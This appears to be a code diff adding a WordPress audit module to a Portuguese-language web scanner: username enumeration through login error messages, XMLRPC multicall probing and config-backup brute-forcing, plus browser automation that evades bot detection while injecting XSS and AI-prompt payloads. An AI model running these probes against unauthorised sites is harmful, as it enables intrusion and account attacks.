+                m2 = re.search(r'author-([a-zA-Z0-9_-]+)', r2.text)
+                if m2:
+                    users.add(m2.group(1))
+
+        # Method 3: Sitemap users
+        r3 = self._get(f"{self.target}/wp-sitemap-users-1.xml")
+        if r3 and r3.status_code == 200:
+            user_urls = re.findall(r'<loc>[^<]*?/author/([^/<]+)/?</loc>', r3.text, re.I)
+            users.update(user_urls)
+
+        # Method 4: wp-login.php brute for known usernames
+        for test_user in ["admin", "administrator", "editor", "wordpress"]:
+            if _cancel_event.is_set():
+                break
+            if test_user in users:
+                continue
+            r4 = self._post(f"{self.target}/wp-login.php", data={
+                "log": test_user, "pwd": "cyberdyne_test_wrong_password_xyz",
+                "wp-submit": "Log In"
+            })
+            if r4 and r4.status_code == 200:
+                body = r4.text.lower()
+                # If error says "password you entered" it means user exists
+                if "the password you entered" in body or "senha que você digitou" in body:
+                    users.add(test_user)
+                # "Unknown username" means user does not exist — skip
+
+        self.users = list(users)
+        if self.users:
+            log(f"  {Fore.GREEN}[WP] {len(self.users)} usuários encontrados: {', '.join(self.users[:10])}{Style.RESET_ALL}")
+        else:
+            log(f"  {Fore.YELLOW}[WP] Nenhum usuário enumerado{Style.RESET_ALL}")
+        return self.users
+
+    # ── 6. _check_xmlrpc ────────────────────────────────────────────────────
+    def _check_xmlrpc(self):
+        if _cancel_event.is_set():
+            return {}
+        log(f"  {Fore.CYAN}[WP] Verificando XMLRPC...{Style.RESET_ALL}")
+        result = {"accessible": False, "methods": [], "multicall": False}
+
+        r = self._get(f"{self.target}/xmlrpc.php")
+        if not r or r.status_code != 200:
+            log(f"  {Fore.GREEN}[WP] XMLRPC não acessível{Style.RESET_ALL}")
+            self.xmlrpc = result
+            return result
+
+        result["accessible"] = True
+        # POST to list methods
+        xml_body = '<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName></methodCall>'
+        r2 = self._post(f"{self.target}/xmlrpc.php", data=xml_body,
+                        headers={**HEADERS_BASE, "Content-Type": "application/xml"})
+        if r2 and r2.status_code == 200:
+            methods = re.findall(r'<string>([^<]+)</string>', r2.text)
+            result["methods"] = methods
+            result["multicall"] = "system.multicall" in methods
+            if result["multicall"]:
+                log(f"  {Fore.RED}[WP] XMLRPC acessível com system.multicall (amplificação de brute-force){Style.RESET_ALL}")
+            else:
+                log(f"  {Fore.YELLOW}[WP] XMLRPC acessível ({len(methods)} métodos){Style.RESET_ALL}")
+
+        self.xmlrpc = result
+        return result
+
+    # ── 7. _check_interesting_findings ───────────────────────────────────────
+    def _check_interesting_findings(self):
+        if _cancel_event.is_set():
+            return []
+        log(f"  {Fore.CYAN}[WP] Verificando achados interessantes...{Style.RESET_ALL}")
+        findings = []
+
+        # Debug log
+        r = self._get(f"{self.target}/wp-content/debug.log")
+        if r and r.status_code == 200 and len(r.text) > 50:
+            findings.append({"type": "debug_log", "severity": "CRITICO",
+                             "detail": f"Debug log exposto ({len(r.text)} bytes)"})
+            log(f"  {Fore.RED}[WP] CRITICO: debug.log exposto!{Style.RESET_ALL}")
+
+        # WP-Cron
+        r2 = self._get(f"{self.target}/wp-cron.php")
+        if r2 and r2.status_code == 200:
+            findings.append({"type": "wp_cron", "severity": "MEDIO",
+                             "detail": "wp-cron.php acessível (vetor DoS)"})
+
+        # Uploads directory listing
+        r3 = self._get(f"{self.target}/wp-content/uploads/")
+        if r3 and r3.status_code == 200 and ("index of" in r3.text.lower() or "<title>Index" in r3.text):
+            findings.append({"type": "dir_listing", "severity": "MEDIO",
+                             "detail": "Directory listing habilitado em /wp-content/uploads/"})
+
+        # Signup (multisite / registration)
+        r4 = self._get(f"{self.target}/wp-signup.php")
+        if r4 and r4.status_code == 200 and "signup" in r4.text.lower():
+            findings.append({"type": "signup", "severity": "BAIXO",
+                             "detail": "wp-signup.php acessível (multisite ou registro habilitado)"})
+
+        # Registration open
+        r5 = self._get(f"{self.target}/wp-login.php?action=register")
+        if r5 and r5.status_code == 200 and "register" in r5.text.lower():
+            findings.append({"type": "registration", "severity": "MEDIO",
+                             "detail": "Registro de usuários aberto"})
+
+        # Full path disclosure
+        r6 = self._get(f"{self.target}/wp-includes/rss-functions.php")
+        if r6 and r6.status_code in (200, 500) and ("Fatal error" in r6.text or "Warning" in r6.text):
+            findings.append({"type": "path_disclosure", "severity": "BAIXO",
+                             "detail": "Full path disclosure via rss-functions.php"})
+
+        # Readme.html
+        r7 = self._get(f"{self.target}/readme.html")
+        if r7 and r7.status_code == 200 and "wordpress" in r7.text.lower():
+            findings.append({"type": "readme", "severity": "BAIXO",
+                             "detail": "readme.html acessível (divulga info do WordPress)"})
+
+        # Config backup brute-force
+        config_paths = _load_payload("WordPress/wp-config-backups.txt")
+        if not config_paths:
+            config_paths = ["wp-config.php.bak", "wp-config.php.old", "wp-config.php.orig",
+                            "wp-config.php~", "wp-config.php.swp", "wp-config.php.save",
+                            "wp-config.php.txt", "wp-config.bak", "wp-config.old",
+                            "wp-config-sample.php"]
+        for path in config_paths:
+            if _cancel_event.is_set():
+                break
+            rc = self._get(f"{self.target}/{path}")
+            if rc and rc.status_code == 200 and "define" in rc.text and "<html" not in rc.text.lower():
+                findings.append({"type": "config_backup", "severity": "CRITICO",
+                                 "detail": f"Backup do wp-config exposto: /{path}"})
+                log(f"  {Fore.RED}[WP] CRITICO: config backup exposto: /{path}{Style.RESET_ALL}")
+
+        # REST API
+        rapi = self._get(f"{self.target}/wp-json/")
+        if rapi and rapi.status_code == 200:
+            try:
+                jdata = rapi.json()
+                if "routes" in jdata:
+                    findings.append({"type": "rest_api", "severity": "BAIXO",
+                                     "detail": f"REST API aberta sem auth ({len(jdata['routes'])} rotas)"})
+            except (ValueError, TypeError):
+                pass
+
+        self.findings = findings
+        log(f"  {Fore.GREEN}[WP] {len(findings)} achados interessantes{Style.RESET_ALL}")
+        return findings
+
+    # ── 8. _check_cves ───────────────────────────────────────────────────────
+    def _check_cves(self):
+        if _cancel_event.is_set():
+            return []
+        log(f"  {Fore.CYAN}[WP] Consultando CVEs para componentes detectados...{Style.RESET_ALL}")
+        all_cves = []
+
+        # WP Core
+        if self.wp_version:
+            cves_v = self.scanner._query_vulners("wordpress", self.wp_version)
+            cves_n = self.scanner._query_nvd("wordpress", self.wp_version)
+            merged = list(set(cves_v + cves_n))
+            if merged:
+                all_cves.append({"component": "WordPress Core", "version": self.wp_version, "cves": merged})
+                log(f"  {Fore.RED}[WP] WordPress {self.wp_version}: {len(merged)} CVEs{Style.RESET_ALL}")
+
+        # Plugins
+        for p in self.plugins:
+            if _cancel_event.is_set():
+                break
+            if p.get("version"):
+                cves_v = self.scanner._query_vulners(p["slug"], p["version"])
+                cves_n = self.scanner._query_nvd(f"wordpress {p['slug']}", p["version"])
+                merged = list(set(cves_v + cves_n))
+                if merged:
+                    all_cves.append({"component": f"Plugin: {p['slug']}", "version": p["version"], "cves": merged})
+                    log(f"  {Fore.RED}[WP] Plugin {p['slug']} {p['version']}: {len(merged)} CVEs{Style.RESET_ALL}")
+
+        # Themes
+        for t in self.themes:
+            if _cancel_event.is_set():
+                break
+            if t.get("version"):
+                cves_v = self.scanner._query_vulners(t["slug"], t["version"])
+                cves_n = self.scanner._query_nvd(f"wordpress {t['slug']}", t["version"])
+                merged = list(set(cves_v + cves_n))
+                if merged:
+                    all_cves.append({"component": f"Theme: {t['slug']}", "version": t["version"], "cves": merged})
+                    log(f"  {Fore.RED}[WP] Tema {t['slug']} {t['version']}: {len(merged)} CVEs{Style.RESET_ALL}")
+
+        self.cves = all_cves
+        return all_cves
+
+    # ── 9. run — Main orchestrator ───────────────────────────────────────────
+    def run(self):
+        if _cancel_event.is_set():
+            return
+        log(f"\n{Fore.MAGENTA + Style.BRIGHT}{'═'*60}")
+        log("  WORDPRESS SECURITY AUDIT")
+        log(f"{'═'*60}{Style.RESET_ALL}")
+
+        # Check if WordPress
+        if not self._is_wordpress():
+            log(f"  {Fore.YELLOW}[WP] Alvo não é WordPress, pulando audit.{Style.RESET_ALL}")
+            return
+
+        log(f"  {Fore.GREEN}[WP] WordPress detectado! Iniciando audit...{Style.RESET_ALL}")
+
+        # Detect version
+        self.wp_version = self._detect_version()
+        if self.wp_version:
+            self.scanner._add(301, "WordPress Version Exposed", "WordPress", "MEDIO", "VULNERAVEL",
+                              url=self.target, evidence=f"WordPress {self.wp_version}",
+                              recommendation="Remover meta generator e desativar feeds de versão",
+                              technique="Version Detection via meta/feed/readme")
+
+        # Enumerate plugins
+        self._enumerate_plugins()
+        if self.plugins:
+            plugin_list = ", ".join(f"{p['slug']}{'@'+p['version'] if p.get('version') else ''}" for p in self.plugins[:15])
+            self.scanner._add(303, "Plugin Enumeration", "WordPress", "BAIXO", "VULNERAVEL",
+                              url=self.target, evidence=f"{len(self.plugins)} plugins: {plugin_list}",
+                              recommendation="Remover plugins desnecessários e manter atualizados",
+                              technique="Passive HTML + Aggressive HEAD brute-force")
+
+        # Enumerate themes
+        self._enumerate_themes()
+        if self.themes:
+            theme_list = ", ".join(f"{t['slug']}{'@'+t['version'] if t.get('version') else ''}" for t in self.themes)
+            self.scanner._add(305, "Theme Enumeration", "WordPress", "BAIXO", "VULNERAVEL",
+                              url=self.target, evidence=f"{len(self.themes)} temas: {theme_list}",
+                              recommendation="Remover temas inativos",
+                              technique="Passive CSS + style.css version extraction")
+
+        # Enumerate users
+        self._enumerate_users()
+        if self.users:
+            self.scanner._add(307, "User Enumeration", "WordPress", "MEDIO", "VULNERAVEL",
+                              url=self.target, evidence=f"Usuários: {', '.join(self.users[:10])}",
+                              recommendation="Desativar REST API users e author archives",
+                              technique="REST API + Author enum + wp-login brute")
+
+        # Check XMLRPC
+        self._check_xmlrpc()
+        if self.xmlrpc.get("accessible"):
+            sev = "ALTO" if self.xmlrpc.get("multicall") else "MEDIO"
+            detail = "XMLRPC acessível"
+            if self.xmlrpc.get("multicall"):
+                detail += " com system.multicall (amplificação de brute-force)"
+            self.scanner._add(308, "XMLRPC Enabled", "WordPress", sev, "VULNERAVEL",
+                              url=f"{self.target}/xmlrpc.php", evidence=detail,
+                              recommendation="Desativar XMLRPC ou bloquear via .htaccess/plugin",
+                              technique="GET + POST system.listMethods")
+
+        # Check interesting findings
+        self._check_interesting_findings()
+        for f in self.findings:
+            ftype = f["type"]
+            if ftype == "debug_log":
+                self.scanner._add(309, "Debug Log Exposed", "WordPress", "CRITICO", "VULNERAVEL",
+                                  url=f"{self.target}/wp-content/debug.log", evidence=f["detail"],
+                                  recommendation="Remover debug.log e desativar WP_DEBUG_LOG em produção",
+                                  technique="Direct GET /wp-content/debug.log")
+            elif ftype == "wp_cron":
+                self.scanner._add(310, "WP-Cron Exposed", "WordPress", "MEDIO", "VULNERAVEL",
+                                  url=f"{self.target}/wp-cron.php", evidence=f["detail"],
+                                  recommendation="Desativar wp-cron.php público e usar cron real do servidor",
+                                  technique="Direct GET /wp-cron.php")
+            elif ftype == "dir_listing":
+                self.scanner._add(311, "Directory Listing (Uploads)", "WordPress", "MEDIO", "VULNERAVEL",
+                                  url=f"{self.target}/wp-content/uploads/", evidence=f["detail"],
+                                  recommendation="Adicionar 'Options -Indexes' no .htaccess",
+                                  technique="GET /wp-content/uploads/")
+            elif ftype == "registration":
+                self.scanner._add(312, "Registration Open", "WordPress", "MEDIO", "VULNERAVEL",
+                                  url=f"{self.target}/wp-login.php?action=register", evidence=f["detail"],
+                                  recommendation="Desativar registro se não necessário",
+                                  technique="GET /wp-login.php?action=register")
+            elif ftype == "config_backup":
+                self.scanner._add(313, "Config Backup Exposed", "WordPress", "CRITICO", "VULNERAVEL",
+                                  url=self.target, evidence=f["detail"],
+                                  recommendation="Remover imediatamente todos os backups do wp-config",
+                                  technique="Brute-force wp-config backup extensions")
+            elif ftype == "rest_api":
+                self.scanner._add(314, "REST API Unrestricted", "WordPress", "BAIXO", "VULNERAVEL",
+                                  url=f"{self.target}/wp-json/", evidence=f["detail"],
+                                  recommendation="Restringir acesso à REST API com plugin ou filtro",
+                                  technique="GET /wp-json/")
+            elif ftype in ("readme", "path_disclosure", "signup"):
+                self.scanner._add(315, "Interesting Finding", "WordPress", "BAIXO", "VULNERAVEL",
+                                  url=self.target, evidence=f["detail"],
+                                  recommendation="Remover ou bloquear acesso a arquivos de informação",
+                                  technique=f"GET check ({ftype})")
+
+        # Check CVEs
+        self._check_cves()
+        if self.wp_version and any(c["component"] == "WordPress Core" for c in self.cves):
+            core_cves = next(c for c in self.cves if c["component"] == "WordPress Core")
+            self.scanner._add(302, "Vulnerable WP Core", "WordPress", "CRITICO", "VULNERAVEL",
+                              url=self.target,
+                              evidence=f"WordPress {self.wp_version} — CVEs: {', '.join(core_cves['cves'][:5])}",
+                              recommendation="Atualizar WordPress para a última versão",
+                              technique="CVE lookup via Vulners/NVD")
+        for cve_entry in self.cves:
+            if cve_entry["component"].startswith("Plugin:"):
+                self.scanner._add(304, f"Vulnerable Plugin: {cve_entry['component']}", "WordPress", "ALTO", "VULNERAVEL",
+                                  url=self.target,
+                                  evidence=f"{cve_entry['component']} {cve_entry['version']} — CVEs: {', '.join(cve_entry['cves'][:5])}",
+                                  recommendation="Atualizar ou remover plugin vulnerável",
+                                  technique="CVE lookup via Vulners/NVD")
+            elif cve_entry["component"].startswith("Theme:"):
+                self.scanner._add(306, f"Vulnerable Theme: {cve_entry['component']}", "WordPress", "ALTO", "VULNERAVEL",
+                                  url=self.target,
+                                  evidence=f"{cve_entry['component']} {cve_entry['version']} — CVEs: {', '.join(cve_entry['cves'][:5])}",
+                                  recommendation="Atualizar ou remover tema vulnerável",
+                                  technique="CVE lookup via Vulners/NVD")
+
+        # Save results to JSON
+        wp_report = {
+            "target": self.target,
+            "is_wordpress": True,
+            "version": self.wp_version,
+            "plugins": self.plugins,
+            "themes": self.themes,
+            "users": self.users,
+            "xmlrpc": {k: v for k, v in self.xmlrpc.items() if k != "methods"},
+            "findings": self.findings,
+            "cves": self.cves,
+            "scan_time": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        }
+        try:
+            out_path = os.path.join(self.output_dir, "wp_audit.json")
+            with open(out_path, "w", encoding="utf-8") as f:
+                json.dump(wp_report, f, indent=2, ensure_ascii=False)
+            log(f"  {Fore.GREEN}[WP] Relatório salvo: {out_path}{Style.RESET_ALL}")
+        except Exception as e:
+            log(f"  {Fore.YELLOW}[WP] Erro ao salvar relatório: {e}{Style.RESET_ALL}")
+
+        total_vulns = sum(1 for r in self.scanner.results if r.category == "WordPress" and r.status == "VULNERAVEL")
+        log(f"\n  {Fore.MAGENTA + Style.BRIGHT}══ WordPress Audit concluído — "
+            f"{Fore.RED}{total_vulns} vulnerabilidades{Fore.MAGENTA} encontradas ══{Style.RESET_ALL}\n")
+
+
+# ─────────────────────────────────────────────────────────────────────────────
 # MÓDULO BONUS — CYBER BROWSER (Playwright — --browser-mimic)
 # Testes client-side com browser real: DOM XSS, Prototype Pollution,
 # Storage Leaks, SPA Routes, Clickjacking, AI Output Injection
@@ -9318,14 +10705,19 @@ class CyberBrowser:
             args=["--disable-blink-features=AutomationControlled",
                   "--no-sandbox", "--disable-dev-shm-usage"]
         )
-        ua = FakeUserAgent().random if HAS_FAKE_UA else HEADERS_BASE.get("User-Agent", "")
+        try:
+            ua = FakeUserAgent().random if HAS_FAKE_UA else None
+        except Exception:
+            ua = None
+        if not ua:
+            ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
         self._context = self._browser.new_context(
             viewport={"width": 1920, "height": 1080},
             user_agent=ua,
             locale="en-US",
             ignore_https_errors=True,
         )
-        if _auth_cookies:
+        if _auth_cookies and isinstance(_auth_cookies, dict) and len(_auth_cookies) > 0:
             domain = urlparse(self.target).netloc
             cookies = [{"name": k, "value": v, "domain": domain, "path": "/"}
                        for k, v in _auth_cookies.items()]
@@ -9364,15 +10756,21 @@ class CyberBrowser:
             inv = 1 - t
             bx = inv**3*x1 + 3*inv**2*t*cx1 + 3*inv*t**2*cx2 + t**3*x2
             by = inv**3*y1 + 3*inv**2*t*cy1 + 3*inv*t**2*cy2 + t**3*y2
-            page.mouse.move(bx, by)
+            page.mouse.move(int(bx), int(by))
             time.sleep(random.uniform(0.005, 0.012))
 
     def _human_type(self, page, selector, text):
+        """Digita texto humano: clica no campo, digita caractere a caractere via keyboard.type()."""
         try:
-            page.click(selector, timeout=3000)
+            el = page.query_selector(selector)
+            if not el:
+                page.fill(selector, text)
+                return
+            el.click(timeout=3000)
+            time.sleep(random.uniform(0.1, 0.3))
+            # keyboard.type() aceita qualquer string (inclusive <, >, ", etc.)
             for ch in text:
-                page.keyboard.press(ch)
-                time.sleep(random.uniform(0.05, 0.15))
+                page.keyboard.type(ch, delay=random.uniform(50, 150))
         except Exception:
             try:
                 page.fill(selector, text)
@@ -9455,9 +10853,7 @@ class CyberBrowser:
                                 self._bezier_move(page, random.randint(100,400), random.randint(100,400),
                                                   bbox["x"] + bbox["width"]/2, bbox["y"] + bbox["height"]/2)
                             inp.click()
-                            for ch in payload:
-                                page.keyboard.press(ch)
-                                time.sleep(random.uniform(0.03, 0.08))
+                            page.keyboard.type(payload, delay=random.uniform(30, 80))
                             page.keyboard.press("Enter")
                             page.wait_for_timeout(2000)
                             if any(MARKER in entry.get("text", "") for entry in self._console_logs):
@@ -9497,13 +10893,20 @@ class CyberBrowser:
                 page.goto(self.target + path, timeout=8000, wait_until="domcontentloaded")
                 page.wait_for_timeout(1000)
                 # Look for chat input
-                chat_sel = page.query_selector("textarea, input[type='text'], [contenteditable='true']")
+                chat_sel = page.query_selector("textarea") or \
+                           page.query_selector("input[type='text']") or \
+                           page.query_selector("[contenteditable='true']")
                 if not chat_sel:
                     continue
                 self._console_logs.clear()
-                self._human_type(page, "textarea, input[type='text']", payload_prompt)
-                # Try submit
-                submit = page.query_selector("button[type='submit'], button:has-text('Send'), button:has-text('Enviar')")
+                # Usar o selector exato do elemento encontrado
+                _tag = chat_sel.evaluate("el => el.tagName.toLowerCase()")
+                _chat_selector = _tag if _tag in ["textarea"] else "input[type='text']"
+                self._human_type(page, _chat_selector, payload_prompt)
+                # Try submit — buscar botão de forma robusta
+                submit = page.query_selector("button[type='submit']") or \
+                         page.query_selector("form button") or \
+                         page.query_selector("button")
                 if submit:
                     submit.click()
                 else:
@@ -9616,9 +11019,12 @@ class CyberBrowser:
                             break
 
             if all_storage:
-                storage_path = os.path.join(self.output_dir, "browser_storage_dump.json")
-                with open(storage_path, "w", encoding="utf-8") as f:
-                    json.dump(all_storage, f, indent=2, ensure_ascii=False)
+                try:
+                    storage_path = os.path.join(self.output_dir, "browser_storage_dump.json")
+                    with open(storage_path, "w", encoding="utf-8") as f:
+                        json.dump(all_storage, f, indent=2, ensure_ascii=False)
+                except Exception:
+                    pass
 
             if leaks:
                 ss = self._screenshot(page, "storage_leak")
@@ -9809,10 +11215,13 @@ class CyberBrowser:
 
         # Save console logs
         if self._console_logs:
-            log_path = os.path.join(self.output_dir, "browser_console_logs.json")
-            with open(log_path, "w", encoding="utf-8") as f:
-                json.dump(self._console_logs[:500], f, indent=2, ensure_ascii=False)
-            log(f"  {Fore.GREEN}[+] Console logs: {log_path}{Style.RESET_ALL}")
+            try:
+                log_path = os.path.join(self.output_dir, "browser_console_logs.json")
+                with open(log_path, "w", encoding="utf-8") as f:
+                    json.dump(self._console_logs[:500], f, indent=2, ensure_ascii=False)
+                log(f"  {Fore.GREEN}[+] Console logs: {log_path}{Style.RESET_ALL}")
+            except Exception:
+                pass
 
         n_ss = self._ss_counter
         if n_ss:
@@ -11959,6 +13368,8 @@ Exemplos de uso:
     parser.add_argument("--stealth", action="store_true", default=False, help="Modo fantasma: delay random + UA rotation")
     parser.add_argument("--ai-payloads", action="store_true", default=False, help="Gemini gera payloads contextuais para cada alvo")
     parser.add_argument("--live", action="store_true", default=False, help="Dashboard visual em localhost:5000")
+    parser.add_argument("--wp", action="store_true", default=False,
+                        help="WordPress Security Audit (WPScan-style: plugins, themes, users, CVEs)")
     parser.add_argument("--browser-mimic", action="store_true", default=False,
                         help="Fase bonus: Playwright browser para DOM XSS real, clickjacking iframe, storage leaks, SPA routes")
     parser.add_argument("-o", "--output", type=str, default="", help="Nome da pasta de output (ex: -o meu_projeto)")
@@ -12102,6 +13513,26 @@ Exemplos de uso:
         else:
             log(f"  {Fore.YELLOW}[~] --browser-mimic requer: pip install playwright playwright-stealth fake-useragent{Style.RESET_ALL}")
             log(f"  {Fore.YELLOW}    Depois: playwright install chromium{Style.RESET_ALL}")
+
+    # ── FASE 2.6: WORDPRESS SECURITY AUDIT (--wp) ──────────────────────────
+    wp_detected = False
+    if do_recon and recon_summary:
+        tf = recon_summary.get("tech_fingerprint", {})
+        all_techs = tf.get("all", [])
+        wp_detected = any("WordPress" in t for t in all_techs)
+
+    if not _cancel_event.is_set() and do_vuln:
+        run_wp = False
+        if hasattr(args, 'wp') and args.wp:
+            run_wp = True
+        elif hasattr(args, 'all') and args.all and wp_detected:
+            run_wp = True
+        if run_wp:
+            try:
+                wp_audit = WPAudit(target, output_dir, scanner)
+                wp_audit.run()
+            except Exception as e:
+                log(f"{Fore.YELLOW}[~] Erro no WP Audit: {e}{Style.RESET_ALL}")
 
     scan_end = datetime.now()
     elapsed  = str(scan_end - scan_start).split(".")[0]
